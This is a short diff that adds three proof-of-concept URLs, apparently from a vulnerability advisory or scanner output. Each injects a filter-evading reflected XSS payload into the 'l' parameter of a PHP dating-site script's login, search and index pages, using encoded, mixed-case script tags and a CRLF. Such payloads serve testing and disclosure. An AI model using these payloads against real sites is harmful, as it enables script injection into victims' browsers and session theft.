@@ -1,0 +1,3 @@
+http://www.example.com/datingscript/login.php?l=1&gt;&quot;&gt;&lt;ScRiPt%20%0d%0a&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
+http://www.example.com/datingscript/search.php?l=1&gt;&quot;&gt;&lt;ScRiPt%20%0d%0a&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
+http://www.example.com/datingscript/index.php?l=1&gt;&quot;&gt;&lt;ScRiPt%20%0d%0a&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
